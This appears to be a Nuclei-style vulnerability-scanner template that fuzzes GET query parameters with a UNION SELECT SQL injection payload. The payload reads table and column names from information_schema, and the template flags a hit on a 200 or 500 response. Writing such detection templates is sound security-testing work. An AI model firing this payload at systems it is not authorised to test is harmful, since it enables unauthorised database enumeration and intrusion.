id: fuzz-sqli-union-select

info:
  name: SQL Injection Detection with UNION SELECT
  author: netbaan
  severity: high
  description: |
    This template is designed to detect SQL injection vulnerabilities using a specific UNION SELECT payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      sqli:
        - "a\\' UNION SELECT 1, NULL, NULL, table_name, column_name FROM information_schema.columns -- - \\u0061\\u0027\\u0020\\u0055\\u004E\\u0049\\u004F\\u004E\\u0020\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054\\u0020\\u0031\\u002C\\u0020"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{sqli}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "table_name"
          - "column_name"

      - type: status
        status:
          - 200
          - 500  # A typical response for a SQL error